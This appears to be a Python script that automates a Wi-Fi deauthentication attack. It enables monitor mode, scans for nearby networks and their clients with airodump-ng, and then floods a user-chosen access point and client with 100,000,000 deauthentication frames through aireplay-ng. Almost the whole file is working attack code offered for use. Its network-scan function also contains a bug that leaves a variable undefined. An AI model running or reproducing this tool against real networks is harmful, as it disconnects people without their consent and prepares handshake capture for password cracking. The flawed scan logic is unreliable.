#!/usr/bin/env python3
import os
import subprocess
import time
import csv
import signal
import sys

def run_command(command, debug_log="debug.log"):
    """
    Run a shell command and return (stdout, stderr).
    Also append output to a debug log file for troubleshooting.
    """
    # Write the command to the debug log
    with open(debug_log, "a", encoding="utf-8") as f:
        f.write(f"\n[DEBUG] Running command: {command}\n")
    
    # Execute the command
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)

    # Print debug info
    print(f"\n[DEBUG] Running command: {command}")
    print(f"[DEBUG] STDOUT:\n{result.stdout}")
    if result.stderr:
        print(f"[DEBUG] STDERR:\n{result.stderr}")
    
    # Also store in debug log
    with open(debug_log, "a", encoding="utf-8") as f:
        f.write(f"[DEBUG] STDOUT:\n{result.stdout}\n")
        f.write(f"[DEBUG] STDERR:\n{result.stderr}\n")

    return result.stdout, result.stderr

def enable_monitor_mode(interface, debug_log="debug.log"):
    """
    Start monitor mode on the given interface using airmon-ng.
    Parse the output to detect the actual monitor-mode interface name.
    If no clear rename is found, fall back to the original interface name.
    """
    stdout, stderr = run_command(f"airmon-ng start {interface}", debug_log=debug_log)

    new_interface = interface  # default fallback
    found_new_iface = False

    # Try to parse lines containing "monitor mode enabled"
    for line in stdout.splitlines():
        line = line.strip()

        if ("monitor mode enabled" in line or "monitor mode already enabled" in line) and " on " in line:
            # Example line:
            # "mac80211 monitor mode enabled for [phy0]wlan0 on [phy0]wlan0mon"
            # or "mac80211 monitor mode already enabled for [phy0]wlan0 on [phy0]10)"
            # We'll split on " on " to isolate the part after ' on '
            parts = line.split(" on ")
            if len(parts) >= 2:
                # e.g., parts[-1] might be "[phy0]wlan0mon" or "[phy0]10)"
                possible_iface = parts[-1].replace("[", "").replace("]", "")
                # That might leave something like "phy0wlan0mon" or "phy010)"

                # Let's do a quick sanity check:
                # If it ends with ")" or looks obviously invalid, we won't trust it.
                # Typically the new interface ends with "mon" or is the same as original interface.
                if possible_iface.endswith(")") or possible_iface == "":
                    # If it's obviously nonsense, skip it
                    continue

                # If it doesn't contain "mon" but is not the original interface, it might be invalid
                # But let's be safe: if we see "mon" in it, assume it's valid
                if "mon" in possible_iface or possible_iface == interface:
                    new_interface = possible_iface
                    found_new_iface = True
                # If we want to handle more edge cases, we can add more checks here
            break

    # If we never found a new interface, we remain using the original 'interface'
    with open(debug_log, "a", encoding="utf-8") as f:
        f.write(f"[DEBUG] Determined monitor interface: {new_interface} (found_new_iface={found_new_iface})\n")

    print(f"[DEBUG] Using monitor interface: {new_interface}")
    return new_interface

def prompt_scan_duration(default=7):
    """Prompt the user for a scan duration in seconds, default to 7 if invalid or empty."""
    try:
        user_input = input(f"[?] Enter scan duration in seconds (default {default}): ")
        if user_input.strip() == "":
            return default
        duration = int(user_input)
        if duration <= 0:
            raise ValueError
        return duration
    except ValueError:
        print("[!] Invalid input. Using default scan duration.")
        return default

def scan_networks(interface, scan_duration, debug_log="debug.log"):
    """
    Scan for wireless networks with airodump-ng, store results, and parse them.
    Exits if no networks are found.
    """
    print("\n[*] Scanning for networks...")
    output_prefix = "scan_results"

    scan_command = f"airodump-ng --band abg --write {output_prefix} --output-format csv {interface}"
    process = subprocess.Popen(scan_command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, shell=True)

    time.sleep(scan_duration)

    print("[DEBUG] Stopping airodump-ng process...")
    try:
        subprocess.run("pkill -f airodump-ng", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print("[ERROR] No airodump-ng process to terminate or another issue occurred.")
        stdout, stderr = process.communicate()

    if stderr:
        err_text = stderr.decode('utf-8', errors='ignore')
        print(f"[DEBUG] Airodump-ng error while scanning networks:\n{err_text}")
        # Also store in debug log
        with open(debug_log, "a", encoding="utf-8") as f:
            f.write(f"[DEBUG] Airodump-ng error while scanning networks:\n{err_text}\n")

    csv_file = f"{output_prefix}-01.csv"
    networks = parse_networks_csv(csv_file, debug_log=debug_log)
    if not networks:
        print("[!] No networks found. Exiting.")
        cleanup_csv(output_prefix)
        sys.exit(1)

    return networks, output_prefix

def parse_networks_csv(file_path, debug_log="debug.log"):
    """
    Parse the airodump-ng CSV file to extract information about networks (BSSID, channel, SSID).
    Determine the band (2.4 GHz or 5 GHz) based on the channel number.
    Return a list of dicts with keys: 'bssid', 'channel', 'ssid', 'band'.
    """
    networks = []
    try:
        with open(file_path, "r", encoding="utf-8") as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                # Skip rows with fewer columns than expected
                if len(row) < 14:
                    continue
                # Skip headers
                if row[0].strip() in ["BSSID", "Station MAC"]:
                    continue
                
                # Parse relevant fields
                bssid = row[0].strip()
                try:
                    channel = int(row[3].strip())  # Parse channel as an integer
                except ValueError:
                    # Skip rows with invalid channel values
                    continue
                ssid = row[13].strip()

                # Determine the band
                if 1 <= channel <= 14:
                    band = "2.4 GHz"
                elif 36 <= channel <= 165:
                    band = "5 GHz"
                else:
                    band = "Unknown"  # For unexpected channel values

                # Debugging: Log each parsed row
                with open(debug_log, "a", encoding="utf-8") as f:
                    f.write(f"[DEBUG] Parsed Row - BSSID: {bssid}, Channel: {channel}, SSID: {ssid}, Band: {band}\n")

                # Include networks with valid BSSID, channel, and SSID
                if bssid and ssid:  # Allow any valid channel
                    networks.append({
                        "bssid": bssid,
                        "channel": channel,
                        "ssid": ssid,
                        "band": band
                    })
    except FileNotFoundError:
        print(f"[DEBUG] CSV file not found: {file_path}")
        with open(debug_log, "a", encoding="utf-8") as f:
            f.write(f"[DEBUG] CSV file not found: {file_path}\n")
    except Exception as e:
        print(f"[DEBUG] Error parsing networks CSV: {e}")
        with open(debug_log, "a", encoding="utf-8") as f:
            f.write(f"[DEBUG] Error parsing networks CSV: {e}\n")

    return networks

def scan_clients(bssid, channel, interface, scan_duration, debug_log="debug.log"):
    """
    Scan for devices/clients connected to a specific network (by BSSID and channel).
    Exits if no clients are found.
    """
    print(f"\n[*] Scanning for clients on BSSID {bssid} (Channel {channel})...")
    output_prefix = "client_results"

    scan_command = (
        f"airodump-ng --bssid {bssid} --channel {channel} "
        f"--write {output_prefix} --output-format csv {interface}"
    )
    process = subprocess.Popen(scan_command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, shell=True)

    time.sleep(scan_duration)

    print("[DEBUG] Stopping airodump-ng process...")
    try:
        subprocess.run("pkill -f airodump-ng", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print("[ERROR] No airodump-ng process to terminate or another issue occurred.")
    stdout, stderr = process.communicate()

    if stderr:
        err_text = stderr.decode('utf-8', errors='ignore')
        print(f"[DEBUG] Airodump-ng error while scanning clients:\n{err_text}")
        with open(debug_log, "a", encoding="utf-8") as f:
            f.write(f"[DEBUG] Airodump-ng error while scanning clients:\n{err_text}\n")

    csv_file = f"{output_prefix}-01.csv"
    clients = parse_clients_csv(csv_file, bssid, debug_log=debug_log)
    if not clients:
        print("[!] No clients found. Exiting.")
        cleanup_csv(output_prefix)
        sys.exit(1)

    return clients, output_prefix

def parse_clients_csv(file_path, target_bssid, debug_log="debug.log"):
    """
    Parse the airodump-ng CSV file to extract information about clients (station MAC).
    Return a list of dicts with key: 'bssid' representing the client MAC.
    """
    clients = []
    try:
        with open(file_path, "r", encoding="utf-8") as csvfile:
            reader = csv.reader(csvfile)

            # We'll detect when the client section starts
            client_section = False

            for row in reader:
                if len(row) < 6:
                    continue

                if row[0].strip() in ["Station MAC", "STATION", "Station"]:
                    client_section = True
                    continue

                if not client_section:
                    continue

                station_mac = row[0].strip()
                associated_bssid = row[5].strip() if len(row) > 5 else None

                # Filter out rows that do not match our target BSSID
                if associated_bssid and associated_bssid.lower() == target_bssid.lower():
                    if station_mac and station_mac != "not associated":
                        clients.append({"bssid": station_mac})
    except FileNotFoundError:
        print(f"[DEBUG] CSV file not found: {file_path}")
        with open(debug_log, "a", encoding="utf-8") as f:
            f.write(f"[DEBUG] CSV file not found: {file_path}\n")
    except Exception as e:
        print(f"[DEBUG] Error parsing clients CSV: {e}")
        with open(debug_log, "a", encoding="utf-8") as f:
            f.write(f"[DEBUG] Error parsing clients CSV: {e}\n")

    return clients

def cleanup_csv(prefix):
    """
    Remove leftover CSV (and related) files generated by airodump-ng
    to keep directory clean.
    """
    for ext in [".csv", ".kismet.csv", ".cap", ".netxml"]:
        fname = f"{prefix}-01{ext}"
        if os.path.exists(fname):
            print(f"[DEBUG] Removing {fname}")
            os.remove(fname)

def display_networks(networks):
    """Display available networks by index."""
    print("\n[INFO] Available Networks:")
    for idx, network in enumerate(networks):
        print(f"[{idx + 1}] BSSID: {network['bssid']} | SSID: {network['ssid']} | Channel: {network['channel']}")
    print()

def display_clients(clients):
    """Display available clients by index."""
    print("\n[INFO] Available Clients:")
    for idx, client in enumerate(clients):
        print(f"[{idx + 1}] Station MAC: {client['bssid']}")
    print()

def select_option(prompt, options):
    """Prompt the user to select an option by index."""
    while True:
        try:
            choice = int(input(prompt)) - 1
            if 0 <= choice < len(options):
                return options[choice]
        except ValueError:
            pass
        print("[!] Invalid choice. Please try again.")

def deauth_attack(ap_mac, client_mac, interface, debug_log="debug.log"):
    """
    Perform a deauthentication attack on the specified AP/client.
    """
    deauth_command = f"aireplay-ng --deauth 100000000 -a {ap_mac} -c {client_mac} {interface}"
    print(f"\n[DEBUG] Deauthentication command: {deauth_command}")
    stdout, stderr = run_command(deauth_command, debug_log=debug_log)
    if stderr:
        print("[!] Deauthentication attack might have encountered an error.")
    else:
        print("[+] Deauthentication attack command sent successfully.")

def main():
    print("=== Wi-Fi Network Scanner and Deauthentication Tool ===")

    # 0. Prompt user for scan duration
    scan_duration = prompt_scan_duration(default=7)

    # 1. Enable monitor mode (default interface 'wlan0', adjust if needed)
    base_interface = "wlan0"
    print(f"\n[*] Using base interface: {base_interface}")
    monitor_interface = enable_monitor_mode(base_interface)

    # 2. Scan for networks
    networks, net_csv_prefix = scan_networks(monitor_interface, scan_duration)
    display_networks(networks)

    # 3. Select a network
    selected_network = select_option("[?] Select a target network by index: ", networks)
    print(f"\n[+] Selected Target AP:")
    print(f"    BSSID: {selected_network['bssid']}")
    print(f"    SSID: {selected_network['ssid']}")
    print(f"    Channel: {selected_network['channel']}")

    # Cleanup network scan files
    cleanup_csv(net_csv_prefix)

    # 4. Scan for clients on the selected network
    clients, client_csv_prefix = scan_clients(
        selected_network["bssid"],
        selected_network["channel"],
        monitor_interface,
        scan_duration
    )
    display_clients(clients)

    # 5. Select a client
    selected_client = select_option("[?] Select a client by index: ", clients)
    print(f"\n[+] Selected Client: {selected_client['bssid']}")

    # Cleanup client scan files
    cleanup_csv(client_csv_prefix)

    # 6. Run deauthentication attack
    deauth_attack(selected_network["bssid"], selected_client['bssid'], monitor_interface)

if __name__ == "__main__":
    main()
